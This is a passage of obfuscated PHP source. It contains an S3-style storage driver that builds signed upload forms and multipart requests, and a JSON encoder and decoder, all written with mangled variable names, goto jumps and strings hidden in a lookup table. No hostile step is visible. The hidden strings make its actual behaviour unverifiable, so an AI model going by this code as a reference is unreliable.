isFile($bô¼¾ÑœÃö) { return !$this->isFolder($bô¼¾ÑœÃö) && $this->objectMeta($bô¼¾ÑœÃö); } public function isFolder($E§ŒŞµÉ¾“) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][223], $E§ŒŞµÉ¾“); } protected function objectMeta($b‡İåÓ…È¬) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][224], $b‡İåÓ…È¬); } protected function _objectMeta($bãçã‡¿Š) { $Eã¬ª³ƒëÌ =& $_SERVER[”Ì÷ñ­î¸]; list($DáÄö„Æ”, $e–¾ëğ¬¬¯) = $this->bucketManager->stat($this->bucket, $bãçã‡¿Š); if ($DáÄö„Æ”) { $DáÄö„Æ”[$Eã¬ª³ƒëÌ[77]] = intval($DáÄö„Æ”[$Eã¬ª³ƒëÌ[1218]]); } return $DáÄö„Æ”; } protected function _isFolder($A¥¬ÏŠá¬¹) { $D×ò·’ßêÔ =& $_SERVER[”Ì÷ñ­î¸]; list($Eí¾Ä¦ ¸», $b™½ùìçğ÷) = $this->bucketManager->listFiles($this->bucket, trim($A¥¬ÏŠá¬¹, $D×ò·’ßêÔ[8]) . $D×ò·’ßêÔ[8], $D×ò·’ßêÔ[33], 1, $D×ò·’ßêÔ[8]); return !empty($Eí¾Ä¦ ¸»[$D×ò·’ßêÔ[1217]]) || !empty($Eí¾Ä¦ ¸»[$D×ò·’ßêÔ[1220]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Cãİª Š–) { parent::__construct($Cãİª Š–); } public function uploadFormData($Eèõº×¶é, $d¶¢“†„Ä = 3600) { goto Dô×ï©ƒ‚; Bì‚Ä¿§: $D©¦„ˆóÀ´ = $c¯ÁÎ¢¿Õó[59]; $Bö¬ƒØ‚©ä = gmdate($c¯ÁÎ¢¿Õó[1134]); $cµßÕã›ƒ = gmdate($c¯ÁÎ¢¿Õó[691]); goto bÄç§¬°í; féƒ³ ”Îù: $f†ï»§±Ø = hash_hmac($c¯ÁÎ¢¿Õó[1143], $D©¦„ˆóÀ´, $añ³ë÷‚ØÑ, !0); $cŸ¯¨‰âë¡ = hash_hmac($c¯ÁÎ¢¿Õó[1143], $d¤‚¬Œ™™Í, $f†ï»§±Ø, !0); $e­ØŞ¤ß‘ = hash_hmac($c¯ÁÎ¢¿Õó[1143], $eˆ …•Ì¼, $cŸ¯¨‰âë¡); goto dèš©–âœ¬; e¬½Î‹ÜÂÚ: $a¿©¤Ğ° = array($this->accessKey, $cµßÕã›ƒ, $this->region, $D©¦„ˆóÀ´, $d¤‚¬Œ™™Í); $F›„î»Àé“ = implode($c¯ÁÎ¢¿Õó[8], $a¿©¤Ğ°); $eñŠÇ¡¿« = array($c¯ÁÎ¢¿Õó[1102] => gmdate($c¯ÁÎ¢¿Õó[1101], strtotime($c¯ÁÎ¢¿Õó[1136])), $c¯ÁÎ¢¿Õó[1103] => array(array($c¯ÁÎ¢¿Õó[1105] => $this->bucket), array($c¯ÁÎ¢¿Õó[1104] => $EĞ‚Šöê‡è), array($c¯ÁÎ¢¿Õó[1106], $c¯ÁÎ¢¿Õó[1107], $c¯ÁÎ¢¿Õó[33]), array($c¯ÁÎ¢¿Õó[1106], $c¯ÁÎ¢¿Õó[1137], $c¯ÁÎ¢¿Õó[33]), array($c¯ÁÎ¢¿Õó[1106], $c¯ÁÎ¢¿Õó[1138], $c¯ÁÎ¢¿Õó[33]), array($c¯ÁÎ¢¿Õó[1108] => $D¶µ·ªœíÂ), array($c¯ÁÎ¢¿Õó[1139] => $F›„î»Àé“), array($c¯ÁÎ¢¿Õó[1140] => $câ‚Óâç‚Ã), array($c¯ÁÎ¢¿Õó[1141] => $Bö¬ƒØ‚©ä), array($c¯ÁÎ¢¿Õó[1142] => $bÎ·Ë‘œé©))); goto C¹×íˆ¥Ï‡; Dô×ï©ƒ‚: $c¯ÁÎ¢¿Õó =& $_SERVER[”Ì÷ñ­î¸]; $EĞ‚Šöê‡è = $c¯ÁÎ¢¿Õó[185]; $câ‚Óâç‚Ã = $c¯ÁÎ¢¿Õó[1133]; goto Bì‚Ä¿§; bÄç§¬°í: $d¤‚¬Œ™™Í = $c¯ÁÎ¢¿Õó[1135]; $bÎ·Ë‘œé© = $d¶¢“†„Ä . $c¯ÁÎ¢¿Õó[33]; $D¶µ·ªœíÂ = $c¯ÁÎ¢¿Õó[1100]; goto e¬½Î‹ÜÂÚ; C¹×íˆ¥Ï‡: $eˆ …•Ì¼ = base64_encode(json_encode($eñŠÇ¡¿«)); $eÖÓß»Ò‚î = hash_hmac($c¯ÁÎ¢¿Õó[1143], $cµßÕã›ƒ, $c¯ÁÎ¢¿Õó[1144] . $this->secret, !0); $añ³ë÷‚ØÑ = hash_hmac($c¯ÁÎ¢¿Õó[1143], $this->region, $eÖÓß»Ò‚î, !0); goto féƒ³ ”Îù; dèš©–âœ¬: $E‹àÆ–ÖÄÆ = array($c¯ÁÎ¢¿Õó[199] => $c¯ÁÎ¢¿Õó[33], $c¯ÁÎ¢¿Õó[1145] => $c¯ÁÎ¢¿Õó[33], $c¯ÁÎ¢¿Õó[1104] => $EĞ‚Šöê‡è, $c¯ÁÎ¢¿Õó[1108] => $D¶µ·ªœíÂ, $c¯ÁÎ¢¿Õó[1112] => $eˆ …•Ì¼, $c¯ÁÎ¢¿Õó[1146] => $F›„î»Àé“, $c¯ÁÎ¢¿Õó[1147] => $câ‚Óâç‚Ã, $c¯ÁÎ¢¿Õó[1148] => $Bö¬ƒØ‚©ä, $c¯ÁÎ¢¿Õó[1149] => $bÎ·Ë‘œé©, $c¯ÁÎ¢¿Õó[1150] => $e­ØŞ¤ß‘, $c¯ÁÎ¢¿Õó[169] => $this->getHost()); return $E‹àÆ–ÖÄÆ; goto Aî•—á«Éª; Aî•—á«Éª: } public function multiUploadFormData($b½æˆöœíí, $E¿Ò†Õ§Á­ = 3600) { $BÜ†­½Ò´õ =& $_SERVER[”Ì÷ñ­î¸]; $Aï® „ù“ = gmdate($BÜ†­½Ò´õ[1232]); $dâ¿ÛÈ°Û¥ = array(); $b–×¯Å‚ºæ = $this->client->getUploadId($this->bucket, $b½æˆöœíí, $dâ¿ÛÈ°Û¥); if (!$b–×¯Å‚ºæ) { return !1; } return array($BÜ†­½Ò´õ[209] => $b–×¯Å‚ºæ, $BÜ†­½Ò´õ[169] => $this->getHost() . $BÜ†­½Ò´õ[8] . $this->pathEncode($b½æˆöœíí), $BÜ†­½Ò´õ[210] => $Aï® „ù“, $BÜ†­½Ò´õ[89] => $b½æˆöœíí); } public function multiUploadAuthData($AÚ¤õªÊÀ, $EÓ”Å’¸ = array()) { goto díªˆ´É™; díªˆ´É™: $FñÇË„í¥µ =& $_SERVER[”Ì÷ñ­î¸]; $Cˆâ––Š¸ = isset($EÓ”Å’¸[$FñÇË„í¥µ[160]]) ? $EÓ”Å’¸[$FñÇË„í¥µ[160]] : $FñÇË„í¥µ[33]; $e¥¶†¤êˆ’ = $EÓ”Å’¸[$FñÇË„í¥µ[89]]; goto Bí©¥íŞè; Eî‹†Ò†ù´: if (isset($EÓ”Å’¸[$FñÇË„í¥µ[1233]])) { $câ¸ô»Ğ”Å[$FñÇË„í¥µ[1234]] = $EÓ”Å’¸[$FñÇË„í¥µ[1233]]; } $EÇ‘›ôô·ì = explode($FñÇË„í¥µ[171], $this->getHost()); $Eá¸™“ôİ = array($FñÇË„í¥µ[1235] => $EÇ‘›ôô·ì[1], $FñÇË„í¥µ[1236] => $FñÇË„í¥µ[33], $FñÇË„í¥µ[199] => $FñÇË„í¥µ[116], $FñÇË„í¥µ[1145] => $EÓ”Å’¸[$FñÇË„í¥µ[77]]); goto CµÂŒ²˜ñŒ; CµÂŒ²˜ñŒ: $f»‚¹‘ÔÍØ = $FñÇË„í¥µ[214]; $b¹ô·³ìù£ = $FñÇË„í¥µ[8] . $this->pathEncode($e¥¶†¤êˆ’) . $Cˆâ––Š¸; $B±æÛÊÌÓ = $this->client->__getSignatureV4($câ¸ô»Ğ”Å, $Eá¸™“ôİ, $f»‚¹‘ÔÍØ, $b¹ô·³ìù£); goto fİˆ¤–Åµë; Bí©¥íŞè: unset($EÓ”Å’¸[$FñÇË„í¥µ[89]]); if (isset($EÓ”Å’¸[$FñÇË„í¥µ[211]])) { return $this->listUploadParts($e¥¶†¤êˆ’, $EÓ”Å’¸); } $câ¸ô»Ğ”Å = array(); goto Eî‹†Ò†ù´; fİˆ¤–Åµë: if (strpos($Cˆâ––Š¸, $FñÇË„í¥µ[213]) === 0) { if (isset($câ¸ô»Ğ”Å[$FñÇË„í¥µ[1234]])) { $aÅ»©¢´àä = $câ¸ô»Ğ”Å[$FñÇË„í¥µ[1234]]; } else { if (isset($B±æÛÊÌÓ[$FñÇË„í¥µ[1234]])) { $aÅ»©¢´àä = $B±æÛÊÌÓ[$FñÇË„í¥µ[1234]]; } else { $aÅ»©¢´àä = hash($FñÇË„í¥µ[1143], $FñÇË„í¥µ[33]); } } return array($FñÇË„í¥µ[220] => $B±æÛÊÌÓ[$FñÇË„í¥µ[220]], $FñÇË„í¥µ[1234] => $aÅ»©¢´àä, $FñÇË„í¥µ[210] => $B±æÛÊÌÓ[$FñÇË„í¥µ[1237]]); } return $B±æÛÊÌÓ[$FñÇË„í¥µ[220]]; goto f•ÁÊ› Ï™; f•ÁÊ› Ï™: } public function listUploadParts($D ó‘ÂÎ‚£, $e­ÄŸ´ßëê = array()) { goto Bæ¢š÷¢‘; eõ‚´ŒÚã‚: $fé“´›…ªÛ .= $dŠŞ´‰‡Ôø[1241]; $AÄê„Ÿá›Ú = array(); $eá†›äÈ… = explode($dŠŞ´‰‡Ôø[171], $this->getHost()); goto D×é±÷Ô¬Ø; D×é±÷Ô¬Ø: $Dô³–é‹ÊÏ = array($dŠŞ´‰‡Ôø[1235] => $eá†›äÈ…[1], $dŠŞ´‰‡Ôø[199] => $dŠŞ´‰‡Ôø[116], $dŠŞ´‰‡Ôø[1145] => strlen($fé“´›…ªÛ)); $c“°ˆ™ÁÏ = $dŠŞ´‰‡Ôø[212]; $A‡½—Ÿ…Éù = $dŠŞ´‰‡Ôø[8] . $this->pathEncode($D ó‘ÂÎ‚£) . $e­ÄŸ´ßëê[$dŠŞ´‰‡Ôø[160]]; goto dšÛĞõ’•; dšÛĞõ’•: $fàÆ§·½İ = $this->client->__getSignatureV4($AÄê„Ÿá›Ú, $Dô³–é‹ÊÏ, $c“°ˆ™ÁÏ, $A‡½—Ÿ…Éù, $fé“´›…ªÛ); return array($dŠŞ´‰‡Ôø[220] => $fàÆ§·½İ[$dŠŞ´‰‡Ôø[220]], $dŠŞ´‰‡Ôø[210] => $fàÆ§·½İ[$dŠŞ´‰‡Ôø[1237]], $dŠŞ´‰‡Ôø[222] => $b¦Â“Ç·©½, $dŠŞ´‰‡Ôø[1234] => $fàÆ§·½İ[$dŠŞ´‰‡Ôø[1234]]); goto Bö÷ƒÕ×ø; Bæ¢š÷¢‘: $dŠŞ´‰‡Ôø =& $_SERVER[”Ì÷ñ­î¸]; $bö‡õªô”„ = str_replace($dŠŞ´‰‡Ôø[221], $dŠŞ´‰‡Ôø[33], $e­ÄŸ´ßëê[$dŠŞ´‰‡Ôø[160]]); $b¦Â“Ç·©½ = $this->client->listParts($this->bucket, $D ó‘ÂÎ‚£, $bö‡õªô”„); goto C•ëÀ‘ñË; C•ëÀ‘ñË: if (!$b¦Â“Ç·©½) { return !1; } $fé“´›…ªÛ = $dŠŞ´‰‡Ôø[1238]; foreach ($b¦Â“Ç·©½ as $FŒÀéÌ°Ñ…) { $fé“´›…ªÛ .= $dŠŞ´‰‡Ôø[1239] . "\x3c\120\141\x72\164\x4e\165\155\142\x65\162\x3e{$FŒÀéÌ°Ñ…[$dŠŞ´‰‡Ôø[1190]]}\74\57\120\141\x72\x74\116\x75\x6d\142\x65\x72\76\xa" . "\74\105\x54\x61\x67\x3e{$FŒÀéÌ°Ñ…[$dŠŞ´‰‡Ôø[1191]]}\74\x2f\105\x54\x61\x67\76\xa" . $dŠŞ´‰‡Ôø[1240]; } goto eõ‚´ŒÚã‚; Bö÷ƒÕ×ø: } public function link($dã›õãÉ…´, $Cƒî·â•Çß = array()) { return parent::link($dã›õãÉ…´, $Cƒî·â•Çß); } public function fileOut($Eï–£»¢ƒ, $Eò®¶ä‚ ò = false, $eäâæÏÎÖ¹ = false, $FĞò³Îê = '') { if (strstr($this->endpoint, $_SERVER[”Ì÷ñ­î¸][1242])) { return parent::fileOutServer($Eï–£»¢ƒ, $Eò®¶ä‚ ò, $eäâæÏÎÖ¹, $FĞò³Îê); } parent::fileOut($Eï–£»¢ƒ, $Eò®¶ä‚ ò, $eäâæÏÎÖ¹, $FĞò³Îê); } public function fileOutImage($Aì¹ä’Ÿƒ, $CÎ›ºªñ¶¬ = 250) { if (strstr($this->endpoint, $_SERVER[”Ì÷ñ­î¸][1242])) { return parent::fileOutImageServer($Aì¹ä’Ÿƒ, $CÎ›ºªñ¶¬); } parent::fileOutImage($Aì¹ä’Ÿƒ, $CÎ›ºªñ¶¬); } public function fileOutLink($AÊòÙ‡Áô£) { $b÷°‚­ÊêÓ =& $_SERVER[”Ì÷ñ­î¸]; if (substr($AÊòÙ‡Áô£, 0, 7) == $b÷°‚­ÊêÓ[1115]) { $AÊòÙ‡Áô£ = $b÷°‚­ÊêÓ[1116] . substr($AÊòÙ‡Áô£, 7); } header($b÷°‚­ÊêÓ[156] . $AÊòÙ‡Áô£); die; } public function getHost() { $cÔ»ÌÍø‚ =& $_SERVER[”Ì÷ñ­î¸]; $EÍ§åˆÌÂ» = str_rtrim(parent::getHost(), $cÔ»ÌÍø‚[8] . $this->bucket); $EÍ§åˆÌÂ» = explode($cÔ»ÌÍø‚[171], $EÍ§åˆÌÂ»); return $EÍ§åˆÌÂ»[0] . $cÔ»ÌÍø‚[171] . $this->bucket . $cÔ»ÌÍø‚[91] . $EÍ§åˆÌÂ»[1]; } } goto dæÄŒØ‰; b©óÃ‹îéÀ: define($_SERVER[”Ì÷ñ­î¸][1939], 16); define($_SERVER[”Ì÷ñ­î¸][1940], 32); class Services_JSON { function __construct($dùØŞó¼– = 0) { $this->use = $dùØŞó¼–; } function utf162utf8($BŠî‡¾·”â) { $F¹ĞÇ‰…›‡ =& $_SERVER[”Ì÷ñ­î¸]; if (function_exists($F¹ĞÇ‰…›‡[68])) { return mb_convert_encoding($BŠî‡¾·”â, $F¹ĞÇ‰…›‡[1592], $F¹ĞÇ‰…›‡[1941]); } $eÍ”ì•…¯„ = ord($BŠî‡¾·”â[0]) << 8 | ord($BŠî‡¾·”â[1]); switch (!0) { case (127 & $eÍ”ì•…¯„) == $eÍ”ì•…¯„: return chr(127 & $eÍ”ì•…¯„); case (2047 & $eÍ”ì•…¯„) == $eÍ”ì•…¯„: return chr(192 | $eÍ”ì•…¯„ >> 6 & 31) . chr(128 | $eÍ”ì•…¯„ & 63); case (65535 & $eÍ”ì•…¯„) == $eÍ”ì•…¯„: return chr(224 | $eÍ”ì•…¯„ >> 12 & 15) . chr(128 | $eÍ”ì•…¯„ >> 6 & 63) . chr(128 | $eÍ”ì•…¯„ & 63); } return $F¹ĞÇ‰…›‡[33]; } function utf82utf16($f„‹Ã§ÕÎƒ) { $f¿ÀƒØ¤– =& $_SERVER[”Ì÷ñ­î¸]; if (function_exists($f¿ÀƒØ¤–[68])) { return mb_convert_encoding($f„‹Ã§ÕÎƒ, $f¿ÀƒØ¤–[1941], $f¿ÀƒØ¤–[1592]); } switch (strlen($f„‹Ã§ÕÎƒ)) { case 1: return $f„‹Ã§ÕÎƒ; case 2: return chr(7 & ord($f„‹Ã§ÕÎƒ[0]) >> 2) . chr(192 & ord($f„‹Ã§ÕÎƒ[0]) << 6 | 63 & ord($f„‹Ã§ÕÎƒ[1])); case 3: return chr(240 & ord($f„‹Ã§ÕÎƒ[0]) << 4 | 15 & ord($f„‹Ã§ÕÎƒ[1]) >> 2) . chr(192 & ord($f„‹Ã§ÕÎƒ[1]) << 6 | 127 & ord($f„‹Ã§ÕÎƒ[2])); } return $f¿ÀƒØ¤–[33]; } function encode($B…ª¬ÓÀ¸°) { $cÌ¾Öå…Ó =& $_SERVER[”Ì÷ñ­î¸]; switch (gettype($B…ª¬ÓÀ¸°)) { case $cÌ¾Öå…Ó[1603]: return $B…ª¬ÓÀ¸° ? $cÌ¾Öå…Ó[1602] : $cÌ¾Öå…Ó[1604]; case $cÌ¾Öå…Ó[1942]: return $cÌ¾Öå…Ó[99]; case $cÌ¾Öå…Ó[303]: return (int) $B…ª¬ÓÀ¸°; case $cÌ¾Öå…Ó[278]: case $cÌ¾Öå…Ó[277]: return (double) $B…ª¬ÓÀ¸°; case $cÌ¾Öå…Ó[312]: $aËÙÌ˜‡ó = $cÌ¾Öå…Ó[33]; $F‰–ŠÆÔ»Ä = strlen($B…ª¬ÓÀ¸°); for ($Cµ»§ÆĞ ‰ = 0; $Cµ»§ÆĞ ‰ < $F‰–ŠÆÔ»Ä; ++$Cµ»§ÆĞ ‰) { $D§õ†ùÌÒ³ = ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰]); switch (!0) { case $D§õ†ùÌÒ³ == 8: $aËÙÌ˜‡ó .= $cÌ¾Öå…Ó[1943]; break; case $D§õ†ùÌÒ³ == 9: $aËÙÌ˜‡ó .= $cÌ¾Öå…Ó[1579]; break; case $D§õ†ùÌÒ³ == 10: $aËÙÌ˜‡ó .= $cÌ¾Öå…Ó[1577]; break; case $D§õ†ùÌÒ³ == 12: $aËÙÌ˜‡ó .= $cÌ¾Öå…Ó[1944]; break; case $D§õ†ùÌÒ³ == 13: $aËÙÌ˜‡ó .= $cÌ¾Öå…Ó[1578]; break; case $D§õ†ùÌÒ³ == 34: case $D§õ†ùÌÒ³ == 47: case $D§õ†ùÌÒ³ == 92: $aËÙÌ˜‡ó .= $cÌ¾Öå…Ó[93] . $B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰]; break; case $D§õ†ùÌÒ³ >= 32 && $D§õ†ùÌÒ³ <= 127: $aËÙÌ˜‡ó .= $B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰]; break; case ($D§õ†ùÌÒ³ & 224) == 192: $Aœ¤µôÜ‹ = pack($cÌ¾Öå…Ó[1945], $D§õ†ùÌÒ³, ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 1])); $Cµ»§ÆĞ ‰ += 1; $dÒ«­‹ë‚ = $this->utf82utf16($Aœ¤µôÜ‹); $aËÙÌ˜‡ó .= sprintf($cÌ¾Öå…Ó[1946], bin2hex($dÒ«­‹ë‚)); break; case ($D§õ†ùÌÒ³ & 240) == 224: $Aœ¤µôÜ‹ = pack($cÌ¾Öå…Ó[1945], $D§õ†ùÌÒ³, ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 1]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 2])); $Cµ»§ÆĞ ‰ += 2; $dÒ«­‹ë‚ = $this->utf82utf16($Aœ¤µôÜ‹); $aËÙÌ˜‡ó .= sprintf($cÌ¾Öå…Ó[1946], bin2hex($dÒ«­‹ë‚)); break; case ($D§õ†ùÌÒ³ & 248) == 240: $Aœ¤µôÜ‹ = pack($cÌ¾Öå…Ó[1945], $D§õ†ùÌÒ³, ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 1]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 2]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 3])); $Cµ»§ÆĞ ‰ += 3; $dÒ«­‹ë‚ = $this->utf82utf16($Aœ¤µôÜ‹); $aËÙÌ˜‡ó .= sprintf($cÌ¾Öå…Ó[1946], bin2hex($dÒ«­‹ë‚)); break; case ($D§õ†ùÌÒ³ & 252) == 248: $Aœ¤µôÜ‹ = pack($cÌ¾Öå…Ó[1945], $D§õ†ùÌÒ³, ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 1]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 2]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 3]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 4])); $Cµ»§ÆĞ ‰ += 4; $dÒ«­‹ë‚ = $this->utf82utf16($Aœ¤µôÜ‹); $aËÙÌ˜‡ó .= sprintf($cÌ¾Öå…Ó[1946], bin2hex($dÒ«­‹ë‚)); break; case ($D§õ†ùÌÒ³ & 254) == 252: $Aœ¤µôÜ‹ = pack($cÌ¾Öå…Ó[1945], $D§õ†ùÌÒ³, ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 1]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 2]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 3]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 4]), ord($B…ª¬ÓÀ¸°[$Cµ»§ÆĞ ‰ + 5])); $Cµ»§ÆĞ ‰ += 5; $dÒ«­‹ë‚ = $this->utf82utf16($Aœ¤µôÜ‹); $aËÙÌ˜‡ó .= sprintf($cÌ¾Öå…Ó[1946], bin2hex($dÒ«­‹ë‚)); break; } } return $cÌ¾Öå…Ó[113] . $aËÙÌ˜‡ó . $cÌ¾Öå…Ó[113]; case $cÌ¾Öå…Ó[1947]: if (is_array($B…ª¬ÓÀ¸°) && count($B…ª¬ÓÀ¸°) && array_keys($B…ª¬ÓÀ¸°) !== range(0, sizeof($B…ª¬ÓÀ¸°) - 1)) { $Eùºõ­ˆÕ‚ = array_map(array($this, $cÌ¾Öå…Ó[1948]), array_keys($B…ª¬ÓÀ¸°), array_values($B…ª¬ÓÀ¸°)); foreach ($Eùºõ­ˆÕ‚ as $b»—ì˜ĞÑ) { if (Services_JSON::isError($b»—ì˜ĞÑ)) { return $b»—ì˜ĞÑ; } } return $cÌ¾Öå…Ó[1068] . join($cÌ¾Öå…Ó[47], $Eùºõ­ˆÕ‚) . $cÌ¾Öå…Ó[315]; } $F©Ò Õ»½Ë = array_map(array($this, $cÌ¾Öå…Ó[1949]), $B…ª¬ÓÀ¸°); foreach ($F©Ò Õ»½Ë as $F Ääƒå¡¿) { if (Services_JSON::isError($F Ääƒå¡¿)) { return $F Ääƒå¡¿; } } return $cÌ¾Öå…Ó[157] . join($cÌ¾Öå…Ó[47], $F©Ò Õ»½Ë) . $cÌ¾Öå…Ó[476]; case $cÌ¾Öå…Ó[1950]: $B®ğó‚Ú« = get_object_vars($B…ª¬ÓÀ¸°); $Eùºõ­ˆÕ‚ = array_map(array($this, $cÌ¾Öå…Ó[1948]), array_keys($B®ğó‚Ú«), array_values($B®ğó‚Ú«)); foreach ($Eùºõ­ˆÕ‚ as $b»—ì˜ĞÑ) { if (Services_JSON::isError($b»—ì˜ĞÑ)) { return $b»—ì˜ĞÑ; } } return $cÌ¾Öå…Ó[1068] . join($cÌ¾Öå…Ó[47], $Eùºõ­ˆÕ‚) . $cÌ¾Öå…Ó[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $cÌ¾Öå…Ó[99] : new Services_JSON_Error(gettype($B…ª¬ÓÀ¸°) . $cÌ¾Öå…Ó[1951]); } } function name_value($aß–’È‡áğ, $Dº®‚·š„©) { $A®åğËµÕ = $this->encode($Dº®‚·š„©); if (Services_JSON::isError($A®åğËµÕ)) { return $A®åğËµÕ; } return $this->encode(strval($aß–’È‡áğ)) . $_SERVER[”Ì÷ñ­î¸][4] . $A®åğËµÕ; } function reduce_string($FÌÅ¢âÛö) { $bïŸçÊÆ¸õ =& $_SERVER[”Ì÷ñ­î¸]; $FÌÅ¢âÛö = preg_replace(array($bïŸçÊÆ¸õ[1952], $bïŸçÊÆ¸õ[1953], $bïŸçÊÆ¸õ[1954]), $bïŸçÊÆ¸õ[33], $FÌÅ¢âÛö); return trim($FÌÅ¢âÛö); } function decode($FêÚí©Æİ‰) { $d‹Ø­‡ÚÀÆ =& $_SERVER[”Ì÷ñ­î¸]; $FêÚí©Æİ‰ = $this->reduce_string($FêÚí©Æİ‰); switch (strtolower($FêÚí©Æİ‰)) { case $d‹Ø­‡ÚÀÆ[1602]: return !0; case $d‹Ø­‡ÚÀÆ[1604]: return !1; case $d‹Ø­‡ÚÀÆ[99]: return null; default: $F˜»¨˜àˆ = array(); if (is_numeric($FêÚí©Æİ‰)) { return (double) $FêÚí©Æİ‰ == (int) $FêÚí©Æİ‰ ? (int) $FêÚí©Æİ‰ : (double) $FêÚí©Æİ‰; } elseif (preg_match($d‹Ø­‡ÚÀÆ[1955], $FêÚí©Æİ‰, $F˜»¨˜àˆ) && $F˜»¨˜àˆ[1] == $F˜»¨˜àˆ[2]) { $B©ã±½®Æñ = substr($FêÚí©Æİ‰, 0, 1); $Cù±·¥®±× = substr($FêÚí©Æİ‰, 1, -1); $b¨ÏŒ©‚ã… = $d‹Ø­‡ÚÀÆ[33]; $fªÛİ‚â¾ó = strlen($Cù±·¥®±×); for ($D£ÚïÂ¸å = 0; $D£ÚïÂ¸å < $fªÛİ‚â¾ó; ++$D£ÚïÂ¸å) { $C•“‘«ô­Ì = substr($Cù±·¥®±×, $D£ÚïÂ¸å, 2); $Fßà›‡º«´ = ord($Cù±·¥®±×[$D£ÚïÂ¸å]); switch (!0) { case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1943]: $b¨ÏŒ©‚ã… .= chr(8); ++$D£ÚïÂ¸å; break; case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1579]: $b¨ÏŒ©‚ã… .= chr(9); ++$D£ÚïÂ¸å; break; case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1577]: $b¨ÏŒ©‚ã… .= chr(10); ++$D£ÚïÂ¸å; break; case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1944]: $b¨ÏŒ©‚ã… .= chr(12); ++$D£ÚïÂ¸å; break; case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1578]: $b¨ÏŒ©‚ã… .= chr(13); ++$D£ÚïÂ¸å; break; case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1358]: case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1956]: case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1572]: case $C•“‘«ô­Ì == $d‹Ø­‡ÚÀÆ[1574]: if ($B©ã±½®Æñ == $d‹Ø­‡ÚÀÆ[113] && $C•“‘«ô­Ì != $d‹Ø­‡ÚÀÆ[1956] || $B©ã±½®Æñ == $d‹Ø­‡ÚÀÆ[55] && $C•“‘«ô­Ì != $d‹Ø­‡ÚÀÆ[1358]) { $b¨ÏŒ©‚ã… .= $Cù±·¥®±×[++$D£ÚïÂ¸å]; } break; case preg_match($d‹Ø­‡ÚÀÆ[1957], substr($Cù±·¥®±×, $D£ÚïÂ¸å, 6)): $aØ–’„–Ô— = chr(hexdec(substr($Cù±·¥®±×, $D£ÚïÂ¸å + 2, 2))) . chr(hexdec(substr($Cù±·¥®±×, $D£ÚïÂ¸å + 4, 2))); $b¨ÏŒ©‚ã… .= $this->utf162utf8($aØ–’„–Ô—); $D£ÚïÂ¸å += 5; break; case $Fßà›‡º«´ >= 32 && $Fßà›‡º«´ <= 127: $b¨ÏŒ©‚ã… .= $Cù±·¥®±×[$D£ÚïÂ¸å]; break; case ($Fßà›‡º«´ & 224) == 192: $b¨ÏŒ©‚ã… .= substr($Cù±·¥®±×, $D£ÚïÂ¸å, 2); ++$D£ÚïÂ¸å; break; case ($Fßà›‡º«´ & 240) == 224: $b¨ÏŒ©‚ã… .= substr($Cù±·¥®±×, $D£ÚïÂ¸å, 3); $D£ÚïÂ¸å += 2; break; case ($Fßà›‡º«´ & 248) == 240: $b¨ÏŒ©‚ã… .= substr($Cù±·¥®±×, $D£ÚïÂ¸å, 4); $D£ÚïÂ¸å += 3; break; case ($Fßà›‡º«´ & 252) == 248: $b¨ÏŒ©‚ã… .= substr($Cù±·¥®±×, $D£ÚïÂ¸å, 5); $D£ÚïÂ¸å += 4; break; case ($Fßà›‡º«´ & 254) == 252: $b¨ÏŒ©‚ã… .= substr($Cù±·¥®±×, $D£ÚïÂ¸å, 6); $D£ÚïÂ¸å += 5; break; } } return $b¨ÏŒ©‚ã…; } elseif (preg_match($d‹Ø­‡ÚÀÆ[1958], $FêÚí©Æİ‰) || preg_match($d‹Ø­‡ÚÀÆ[1959], $FêÚí©Æİ‰)) { goto bğ…®·Öó¢; d‡¾É­Áá: for ($D£ÚïÂ¸å = 0; $D£ÚïÂ¸å <= $fªÛİ‚â¾ó; ++$D£ÚïÂ¸å) { $A°™Ö’»¿ = end($f­êï£”Á); $C•“‘«ô­Ì = substr($Cù±·¥®±×, $D£ÚïÂ¸å, 2); if ($D£ÚïÂ¸å == $fªÛİ‚â¾ó || $Cù±·¥®±×[$D£ÚïÂ¸å] == $d‹Ø­‡ÚÀÆ[47] && $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[1960]] == SERVICES_JSON_SLICE) { $BğôùŞ†‘é = substr($Cù±·¥®±×, $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[263]], $D£ÚïÂ¸å - $A°™Ö’»¿[$d‹Ø­‡ÚÀÆ[263]]); array_push($f­êï£”Á, array($d‹Ø­‡ÚÀÆ[1960] => SERVICES_JSON_SLICE, $d‹Ø­‡ÚÀÆ[263] => $D£ÚïÂ¸å + 1, $d‹Ø­‡ÚÀÆ[1961] => !1)); if (reset($f­êï£”Á) == SERVICES_JSON_IN_ARR) { 